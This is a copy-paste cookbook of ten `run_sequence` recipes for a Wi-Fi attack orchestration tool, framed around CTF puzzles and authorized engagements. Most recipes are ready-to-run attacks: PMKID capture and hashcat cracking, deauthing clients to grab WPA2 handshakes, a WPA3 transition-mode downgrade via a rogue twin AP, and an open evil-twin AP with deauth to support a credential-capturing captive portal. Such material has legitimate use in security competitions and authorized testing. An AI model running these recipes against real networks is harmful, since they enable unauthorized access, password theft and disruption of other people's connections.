# recipes — copy-paste `run_sequence` cookbook

Ten pipelines you'll reach for repeatedly, as literal `run_sequence`
JSON. Every recipe is one call; the orchestrator handles envelope
merging, `enforce_rogue_limits` between steps, and airspace-flag
propagation.

Set `i_own_the_airspace=True` at the top of every call, or replace
with a scoped `authorization={...}` per
[`legal_and_consent.md`](legal_and_consent.md). Omitted below for
readability.

## R1 — Cold-start recon (always run first)

**When.** You just walked in. You have nothing but the box up.

```python
run_sequence(steps=[
    {"action": "recon_start", "band": "both", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},
])
```

Follow with `list_aps(seen_since_s=20)`.

## R2 — PMKID fastpath (client-free WPA2 crack)

**When.** `list_aps` shows a WPA2-PSK AP with `pmkid_present=true`
(surfaced by the 3.1 normalizer). No client needed.

```python
run_sequence(steps=[
    {"action": "capture_pmkid",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 30,
     "out_path": "/tmp/pmkid.pcapng"},
    {"action": "convert_to_hashcat",
     "pcap_path": "/tmp/pmkid.pcapng",
     "out_path":  "/tmp/pmkid.22000"},
    {"action": "crack_start",
     "hash_path": "/tmp/pmkid.22000",
     "wordlist_path": "rockyou.txt",
     "mode": 22000},
])
```

Deeper: [`knowledge/pmkid/`](../knowledge/pmkid/).

## R3 — 4-way with targeted deauth (WPA2-PSK + live client)

**When.** No PMKID in M1, but a client is talking. Kick it, catch its
handshake on the return.

```python
run_sequence(steps=[
    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
    {"action": "wait", "s": 10},
    {"action": "recon_stop"},
    {"action": "capture_handshake",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "deauth_client": "11:22:33:44:55:66",
     "timeout_s": 60,
     "out_path": "/tmp/hs.pcapng"},
    {"action": "convert_to_hashcat",
     "pcap_path": "/tmp/hs.pcapng",
     "out_path":  "/tmp/hs.22000"},
    {"action": "crack_start",
     "hash_path": "/tmp/hs.22000",
     "wordlist_path": "rockyou.txt",
     "mode": 22000},
])
```

If the capture is suspect (`hcxpcapngtool --info` shows 0 lines), see
[`handshake_forensics.md`](handshake_forensics.md) before the retry.

## R4 — Evil-twin farm diff (which BSSID is real?)

**When.** Multiple APs advertise the same SSID. The corpus prose is in
[`knowledge/ctf/evil-twin-farms.md`](../knowledge/ctf/evil-twin-farms.md).

```python
run_sequence(steps=[
    {"action": "recon_start", "band": "both", "dwell_ms": 250},
    {"action": "wait", "s": 20},
    {"action": "recon_stop"},
    # Capture a beacon-heavy pcap for the diff
    {"action": "capture_handshake",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 15,
     "out_path": "/tmp/beacons.pcapng"},
    {"action": "beacon_diff",
     "bssid_a": "AA:BB:CC:DD:EE:FF",
     "bssid_b": "AA:BB:CC:DD:EE:00",
     "pcap_path": "/tmp/beacons.pcapng"},
])
```

The diff highlights: which IEs one has that the other doesn't,
per-IE hex diff. Real APs share a chipset/firmware IE fingerprint;
the clone usually diverges on TIM cadence, Country IE, or Vendor OUI.

## R5 — Hidden-SSID reveal (patience > shots fired)

**When.** Beacon has SSID IE zeroed. A returning client will name it.

```python
run_sequence(steps=[
    {"action": "recon_start", "band": "both", "dwell_ms": 300},
    {"action": "wait", "s": 90},
    {"action": "recon_stop"},
    {"action": "list_probe_requests", "seen_since_s": 90},
])
```

No transmission needed. Deeper:
[`knowledge/ctf/hidden-ssid-mazes.md`](../knowledge/ctf/hidden-ssid-mazes.md).

## R6 — WPA3 transition-mode downgrade

**When.** RSN IE lists both AKM 2 (PSK) and AKM 8 (SAE). Some clients
will fall back to WPA2 if the neighbor only advertises PSK.

```python
run_sequence(steps=[
    # 1. Stand up a WPA2-only twin next to the WPA3 transition AP
    {"action": "create_rogue_ap",
     "ssid": "target-network",
     "bssid": "AA:BB:CC:DD:EE:F0",
     "channel": 6, "band": "2.4",
     "security": "wpa2_psk",
     "passphrase": "irrelevant-just-need-4way"},
    # 2. Kick clients off the real AP; some will re-associate to the twin
    {"action": "deauth",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "count": 10, "respect_pmf": True},
    # 3. Catch the 4-way against the twin
    {"action": "capture_handshake",
     "bssid": "AA:BB:CC:DD:EE:F0",
     "timeout_s": 90,
     "out_path": "/tmp/downgrade.pcapng"},
    {"action": "convert_to_hashcat",
     "pcap_path": "/tmp/downgrade.pcapng",
     "out_path":  "/tmp/downgrade.22000"},
    {"action": "crack_start",
     "hash_path": "/tmp/downgrade.22000",
     "wordlist_path": "rockyou.txt", "mode": 22000},
])
```

Preconditions matter — a WPA3-only client won't downgrade. Deeper:
[`knowledge/ctf/wpa3-transition-downgrade.md`](../knowledge/ctf/wpa3-transition-downgrade.md).

## R7 — Beacon-IE decode loop (stego triage)

**When.** A flag might be buried in a Vendor IE, Country IE, or
custom-ID payload. Reading beats guessing.

```python
run_sequence(steps=[
    {"action": "capture_handshake",
     "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 20,
     "out_path": "/tmp/beacons.pcapng"},
    {"action": "decode_ies", "pcap_path": "/tmp/beacons.pcapng"},
])
```

Output is `{bssid: {ie_id: bytes_hex}}`. Look for printable ASCII in
vendor IEs (OUI + type + payload); check Country IE for oddities;
look for repeated Vendor OUI 00:00:00 (a dead giveaway of a hand-authored
IE). Deeper:
[`knowledge/ctf/beacon-flag-stego.md`](../knowledge/ctf/beacon-flag-stego.md).

## R8 — Probe-request harvest (client-side puzzles)

**When.** The flag is in what a specific client asks for. Passive.

```python
run_sequence(steps=[
    {"action": "recon_start", "band": "both", "dwell_ms": 250},
    {"action": "pineap_config",
     "log_probes": 1, "karma": 0, "beacon_response": 0},
    {"action": "pineap_start"},
    {"action": "wait", "s": 300},           # 5-minute passive
    {"action": "pineap_stop"},
    {"action": "list_probe_requests", "seen_since_s": 300},
])
```

Then filter by `client_mac` to zero in on the target. Deeper:
[`knowledge/ctf/probe-request-flag.md`](../knowledge/ctf/probe-request-flag.md).

## R9 — Captive-portal cred-flag setup (framework only)

**When.** The flag is what a user types into a login page. `serve_captive_portal`
is deferred — this recipe puts the rogue AP up; you host the portal
yourself off-box (a Flask server, nginx serving a static HTML form,
whatever).

```python
run_sequence(steps=[
    {"action": "create_rogue_ap",
     "ssid": "TargetWiFi",           # match the venue SSID
     "channel": 1, "band": "2.4",
     "security": "open"},
    {"action": "deauth",             # peel clients off the real one
     "bssid": "AA:BB:CC:DD:EE:FF",
     "count": 5, "respect_pmf": True},
    # DHCP + captive-portal DNS trick lives on your laptop, not the box.
    # `enforce_rogue_limits` will fire between steps if MAX_ROGUE_MINUTES > 0.
])
```

Deeper: [`knowledge/ctf/captive-portal-cred-flags.md`](../knowledge/ctf/captive-portal-cred-flags.md)
and [`knowledge/captive-portal/`](../knowledge/captive-portal/).

## R10 — Scoring-bot fingerprint (find real targets vs. decoys)

**When.** The room is 30 APs and 5 are the puzzle. A scorer client
pings its own targets on a schedule.

```python
run_sequence(steps=[
    {"action": "recon_start", "band": "both", "dwell_ms": 250},
    {"action": "pineap_config", "log_probes": 1},
    {"action": "pineap_start"},
    {"action": "wait", "s": 900},           # 15-minute baseline
    {"action": "pineap_stop"},
    {"action": "recon_stop"},
    {"action": "list_probe_requests", "seen_since_s": 900},
    {"action": "list_associations"},
])
```

Analyse off-box: which client MACs show periodic probes (30 s or 60 s
cadence, stable OUI, targeting a specific BSSID set)? Those BSSIDs
are the real puzzle. Deeper:
[`knowledge/ctf/scoring-recon.md`](../knowledge/ctf/scoring-recon.md).

## Bonus — the post-engagement audit

**When.** Puzzle solved or abandoned. Log every call for the writeup.

```python
call_log(ssh=True, api=True)
```

Merged SSH + API timeline. Pair with your notes file. The
timeline is the load-bearing artifact for:

- **Team debriefs** — what did we try, when, what happened?
- **CTF writeups** — the community-facing publication.
- **Blue-team lab reports** — for red-team engagements, this is the
  attacker-side timeline that pairs with the blue team's IDS log.

## When to reach for which

| you have                              | recipe          |
| ------------------------------------- | --------------- |
| Nothing but the box                   | R1              |
| WPA2-PSK with PMKID leak              | R2 (fastest)    |
| WPA2-PSK + a live client              | R3              |
| Two APs same SSID                     | R4              |
| Hidden-SSID beacons                   | R5              |
| WPA3 transition-mode target           | R6              |
| Weird IEs, suspect stego              | R7              |
| Client-side probe puzzle              | R8              |
| Captive-portal target                 | R9              |
| Too many APs, don't know which is it  | R10             |
| Puzzle over, want the timeline        | `call_log`      |
